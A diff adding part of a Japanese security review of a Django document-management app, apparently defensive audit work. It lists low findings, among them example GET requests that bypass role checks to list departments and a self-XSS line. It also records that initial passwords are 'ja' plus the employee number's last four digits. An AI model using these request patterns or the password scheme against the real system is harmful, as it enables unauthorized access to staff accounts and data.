+  - .env.example のプレースホルダを、明らかに本物でないと分かる文言（例: <REQUIRED: generate with ...>）にする。
+
+
+════════════════════════════════════════════════════════════════════════
+【低】L-1: permissions/api.py OptionListAPIView のロール制御欠如
+════════════════════════════════════════════════════════════════════════
+- 該当箇所: permissions/api.py:32 付近  OptionListAPIView（LoginRequiredMixin のみ）
+- カテゴリ: broken_access_control（部署跨ぎの業務メタデータ開示）
+- 優先度: 低（読み取り専用・マスタ名のみ・変更不可。チーム自身が同ファイル内コメントで「優先度: 低・見送り」と記録済み）
+
+説明:
+  OptionListAPIView は LoginRequiredMixin のみを継承し、ロールゲート・部署スコープが無い。
+  権限管理画面（SETTINGS_MENU_VISIBLE_ROLES["authority_management"] = {ADMIN, MANAGER}）に
+  アクセスできない一般ユーザーでも、ログインさえしていれば
+    GET /permissions/api/options/?type=dept                  → 全部署（本支所｜部課名）
+    GET /permissions/api/options/?type=group&doc_kbn=contract → 全契約書分類名
+    GET /permissions/api/options/?type=group&doc_kbn=document → 全文書分類名
+  を直接取得できる。
+
+  対して core/api.py BaseOptionListAPIView は非管理者を visible_department_ids /
+  contract_searchable_department_ids にスコープしており、organizations/api.py OptionListAPIView.dispatch は
+  2026-08-24 のコード監査で同種のバグ（LoginRequiredMixin のみで全部署が取れる）を修正し
+  can_access_settings_menu_item チェックを追加済み。permissions/api.py だけがこの統一的対策から外れている。
+
+  影響は部署名・分類/カテゴリー名という業務メタデータの開示にとどまり、PermissionProfile 自体の
+  変更や PII・認証情報の漏洩は伴わない。
+
+推奨対応:
+  - organizations/api.py と同様に dispatch() で
+    can_access_settings_menu_item(request.user, "authority_management")（ADMIN+MANAGER）を要求。
+  - type=dept は AuthorityEditView の contract_visible_departments が管理者限定であることに合わせ ADMIN のみに制限。
+  - 対応不要と判断する場合も、既存コメントの前提（「他画面でも同種ロールに露出済み」）は
+    core/api.py の実装と矛盾しているため、判断根拠を更新すること。
+
+
+════════════════════════════════════════════════════════════════════════
+【低】L-2: 保管画面1のファイル選択リスト表示が innerHTML（self-XSS のみ）
+════════════════════════════════════════════════════════════════════════
+- 該当箇所:
+    templates/documents/storage1.html:63   fileList.innerHTML = `選択されたファイル (${files.length}個):<br>` + names.join('<br>');
+    templates/contracts/storage1.html:63   （同等）
+- カテゴリ: dom-xss（self-XSS）
+- 優先度: 低（他ユーザーに影響しない。まだアップロード・永続化されていない、選択中ユーザー自身の
+  ブラウザ上のファイル名のみ。悪用には被害者が自分のディスク上の悪意あるファイル名を自分で選ぶ必要がある）
+
+推奨対応:
+  - 各ファイル名をテキストノード／textContent で追加する。軽微だがシンクを1つ減らせる。
+
+
+════════════════════════════════════════════════════════════════════════
+【低】L-3: ALLOWED_HOSTS のデフォルトが ["*"]
+════════════════════════════════════════════════════════════════════════
+- 該当箇所: config/settings/base.py:19  ALLOWED_HOSTS = env.list("ALLOWED_HOSTS", default=["*"])
+  （prod.py でオーバーライド無し）
+- カテゴリ: security_misconfiguration
+- 優先度: 低（本アプリはパスワードリセットメール等の絶対URL生成経路が乏しく、実害は限定的。
+  ただし Host ヘッダー検証を無効化するデフォルトは避けるべき）
+
+推奨対応:
+  - prod.py で ALLOWED_HOSTS = env.list("ALLOWED_HOSTS")（デフォルト無し）にし明示設定を強制。
+
+
+════════════════════════════════════════════════════════════════════════
+【情報】I-1: 初期パスワードが職員番号から予測可能
+════════════════════════════════════════════════════════════════════════
+- 該当箇所:
+    accounts/forms.py:126        StaffRegistForm.save        … "ja" + employee_no[-4:]
+    accounts/csv_import_services.py:171                       … 同上
+  初回ログイン時のパスワード変更強制も無い。
+- xlsx 職員マスタ!B184 で明示指定された仕様のため逸脱不可。職員番号が分かれば初回変更前の
+  アカウントに推測ログインが可能である点を運用上の注意として記録する
+  （原本フィデリティ方針上、実装変更は行わない）。
+
+
+════════════════════════════════════════════════════════════════════════
+確認して問題なしだった項目
+════════════════════════════════════════════════════════════════════════
+
+■ 重点確認項目1（ボタン非表示 vs サーバー側強制）— M-1・L-1 以外はすべて一致
+  - documents/contracts の Download / Preview / Detail(API) / Edit / Delete / BulkEdit 系ビューは
+    すべて scoped_get_object_or_404（document_searchable_department_ids /
+    contract_searchable_department_ids）で部署スコープを強制。pk 直打ちの部署跨ぎ IDOR は無し。
+  - DetailAPIView（documents/api.py:40, contracts/api.py:48）は get_object_or_404 直後に
+    allowed_department_ids メンバーシップ検証 ＋ PermissionDenied ＋ logger.warning。
+  - 削除ボタン（delete_url=None）: core/record_views.py:213 BaseDeleteView.post が
+    deletion_services.can_delete(obj)（is_deleted=False かつ7日ウィンドウ内）をサーバー側で再検証。
+  - 契約書 編集/削除（contract_edit フラグ）: contracts/views.py:52 RequiresContractEditMixin が
+    UploadStep1/2・ContractEditView・BulkEditStart/BulkEditView・PendingPreview・UploadStep2Remove・
+    contracts/api.py ChunkUploadAPIView の dispatch() で can_edit_contract を強制。
+    DeleteView.extra_permission_check も再検証（過去の URL直打ちバイパスを塞いだ経緯を docstring に記録）。
+  - Download/Preview（doc_download / contract_download フラグ）: core/record_views.py:41,105・
+    core/upload_views.py:245 が can_download を再検証し PermissionDenied。
+  - アップロード/編集フォームの department 欄（管理者限定 can_select_department）: 非管理者は
+    view 側で department = request.user.department を強制（documents/views.py:118,
+    contracts/views.py:173, apply_document_edit/apply_contract_edit, *_edit_is_dirty）。disabled 改ざんは無効化。
+  - マスタ一覧の sort=department（非管理者から隠す列）: core/master_views.py:74・
+    permissions/services.py:189 で is_admin ゲート。
+  - マスタ Group/Category 削除の「関連文書0件」ルール: core/master_views.py:310 blocking_count をサーバー側で再検証。
+  - 権限管理編集の contract_visible_departments（非管理者編集者から隠す）: permissions/forms.py:109 が
+    del self.fields[...] するため、ModelForm._save_m2m が POST 注入値を無視する真のサーバー側強制。
+  - メインメニューのボタン（show_storage_contract 等）: MenuView は表示専用。実エンドポイントは独立にゲート済み。
+
+■ 重点確認項目2（機微情報のハッシュ化・マスク）
+  - PASSWORD_HASHERS は Argon2 優先で並び順不変（base.py:96）。AUTH_PASSWORD_VALIDATORS 4種設定済み。
+  - パスワードは全経路で set_password() 使用（StaffRegistForm.save / StaffEditForm.save / CSV取込 create_user）。
+    .password への生代入・make_password の誤用は無し。
+  - PasswordInput(render_value=False)（forms.py:146）で再表示時プリフィルなし。ログイン画面・
+    職員マスタ詳細/編集・その他設定パスワード変更で一貫してマスク。
+  - 職員マスタ CSV出力（accounts/views.py:141）はパスワード列を空文字固定（xlsx B91 準拠）。
+  - 認証失敗ログ・監査ログ・build_staff_edit_diff_message はパスワード値を記録せず「(変更あり)」のみ。
+  - CSV取込のパスワードもハッシュ化。取込で作成できるのは STAFF/MANAGER のみ（ADMIN 昇格不可、
+    退職者昇格拒否、既存 ADMIN 不可侵）。employee_no は NFKC 正規化 ＋ isdigit()。
+
+■ 重点確認項目3（外部境界の例外処理）
+  - BaseFileServeView / zip_services / purge_expired_deleted_records._delete_file は OSError 全般を
+    捕捉し logger.exception ＋利用者向け応答（404/warning）。bare except なし。
+  - OCR/pdfplumber 系（text_extraction_services.py:56, ocr_layout_services.py:110）の広域 except Exception は
+    「1件/1ページの失敗で全体を止めない」設計判断としてコメント明記済み。セキュリティ上意味のある失敗の握り潰しではない。
+  - OCR パイプラインは poppler_path を settings（.env、信頼値）から取得。シェル呼び出し・
+    ユーザー値の argv 混入なし。pdf2image.convert_from_bytes に pdf_bytes（ファイル内容）を渡すのみ。
+  - 例外メッセージ／トレースバックを利用者に返す debug 情報露出は無し（DEBUG=False 前提、
+    JsonResponse は汎用文言）。
+
+■ インジェクション（A陣）
+  - SQLインジェクション: 皆無。フリーワード/タイトル検索（documents/contracts/core search_services）は
+    ORM の Q(**{f"{field}_normalized__icontains": normalize_for_search(word)})・.filter(...__in=[int(y) ...])・
+    Python の &|（Q オブジェクト）のみで構築。SearchQuery・生 tsquery・.raw()・.extra()・RawSQL・__regex は不使用。
+    ソートキーは固定 SORT_FIELDS 辞書ルックアップ、方向は "-" 前置のみ。pks は int() キャスト＋拒否をログ記録。
+    唯一の cursor.execute（core/views.py:297）は定数 "SELECT 1" のヘルスチェック。
+  - コマンドインジェクション: subprocess / os.system / os.popen / Popen / shell=True / eval / exec /
+    pickle / yaml.load / __import__ / marshal はアプリコードに存在しない。
+  - テンプレートインジェクション: 動的テンプレート名の get_template / select_template / Template() / Engine() は無し。
+  - パストラバーサル / zip-slip / ヘッダーインジェクション: 一時パスは
+    Path(MEDIA_ROOT)/tmp_uploads/f"{uuid4().hex}_{name}"、uploaded_file.name は Django が basename 化済み、
+    チャンク結合パスは Path(original_filename).name で正規化、upload_id は ^[0-9a-zA-Z-]{1,64}$ 検証、
+    chunk_index/total_chunks は int()。open_pending_file / BasePendingPreviewView はセッション格納の
+    サーバー生成名のみ受け取り、他人の一時ファイル参照不可。ZIP エントリ名・Content-Disposition の
+    filename は display_name（区切り文字を含まない）で zip-slip・ヘッダー改行注入なし。
+  - サーバー側テンプレート: templates/ 内にユーザーデータへの |safe / autoescape off / format_html / mark_safe は無し。
+    唯一の mark_safe は core/widgets.py:170,210 で、ユーザー由来値は全て django.utils.html.escape() 通過済み、
+    非エスケープ部（popup_type / mode / api_url）は開発者定数 / reverse_lazy + urlencode。
+  - CSV数式インジェクション: 3つのエクスポータ（accounts/views.py:137, audit/views.py:60,
+    permissions/views.py:92）すべて sanitize_csv_row（= + - @ TAB CR 前置）を通過。
+
+■ 認証・認可・セッション（B陣）
+  - IDOR: masters Group/Category Edit/Delete は scoped_get_object_or_404、
+    RetentionPeriod・Department・Staff・Audit 系は SettingsMenuAccessMixin で ADMIN 限定
+    （管理者スコープ = 全部署のため plain get_object_or_404 でも IDOR ではない）。
+  - 権限昇格: AuthorityEditView.dispatch が can_manage_target を強制（MANAGER は同部署 STAFF のみ、
+    自己不可、MANAGER/ADMIN ターゲット不可）。role <select> の選択肢を _editable_roles →
+    AuthorityEditForm.__init__ でサーバー側制限するため POST 注入 role=admin は is_valid() で落ちる。
+    自己昇格経路なし。StaffDeleteView / AuthorityDeleteView は存在しない（退職はフラグ、ハード削除はバッチのみ）。
+  - Mixin 順序: RequiresContractEditMixin は LoginRequiredMixin を継承し is_authenticated を先に確認。
+    SettingsMenuAccessMixin は dispatch() で LoginRequiredMixin の後に実行。
+    organizations/api.py:38 は role チェック前に is_authenticated を明示確認（AnonymousUser 500 回避）。
+  - すべての状態変更ビューは POST 限定。GET によるミューテーションなし。HealthCheckView（公開・ログイン不要）は "SELECT 1" のみ。
+  - セッション: SESSION_ENGINE = Django 既定（DBバック）→ セッション内容はクライアント改ざん不可
+    （一括編集の state["pks"] は信頼可能、かつ resolve_ordered_pks で再スコープ）。
+    login()/logout() は Django 標準（cycle_key でセッション固定攻撃対策、logout で flush）。
+    パスワード変更は update_session_auth_hash。アイドルタイムアウトは
+    core/middleware.py:12 SessionIdleTimeoutMiddleware でサーバー側強制（クライアントタイマーではない）。
+    prod.py: SESSION_COOKIE_SECURE / CSRF_COOKIE_SECURE / SECURE_SSL_REDIRECT / HSTS /
+    SECURE_CONTENT_TYPE_NOSNIFF 設定済み。SESSION_COOKIE_HTTPONLY / SAMESITE=Lax は Django 既定。
+  - CSRF: CsrfViewMiddleware 有効。コードベース全体に csrf_exempt / @method_decorator(csrf_exempt) は皆無
+    （チャンクアップロード API 含む）。全 POST テンプレートに {% csrf_token %}、AJAX は csrftoken クッキー参照。
+  - core/double_submit.py はサーバー側セッション格納の同一セッション冪等トークンで、CSRF を
+    弱めたり置き換えたりしない（クライアント値を identity として信頼しない）。
+
+■ シークレット・暗号（C陣）
+  - リポジトリ内のハードコード認証情報: SECRET_KEY のデフォルト（M-2）以外に、API キー・
+    トークン・DB パスワード・秘密鍵の平文コミットは検出されず。
+  - GOOGLE_APPLICATION_CREDENTIALS は .env → 環境変数経由で SDK が読む方式。鍵本体はリポジトリ外。
+  - LOGGING（base.py）は整形フォーマットに PII/シークレットを含めない。prod の EMAIL_HOST_PASSWORD 等は .env 経由。
+  - SESSION_SERIALIZER は既定（JSON）。独自 md5/sha1/random トークンなし。二重送信トークン・
+    一時ファイル名はすべて uuid.uuid4().hex。
+  - DEBUG は env 既定 False、prod.py で DEBUG = False を明示。
+
+
+════════════════════════════════════════════════════════════════════════
+除外した検討事項
+════════════════════════════════════════════════════════════════════════
+DoS・ReDoS・レート制限・リソース枯渇、他プロセスで保護される前提のディスク上シークレット
+（リポジトリにコミットされた鍵は M-2 として報告済み）、既知のライブラリ更新、
+PII/シークレットを含まないログ出力、監査ログの有無、理論上のレースコンディション・
+タイミング攻撃、ログインスロットリングの不在は本レビューの対象外として除外した。
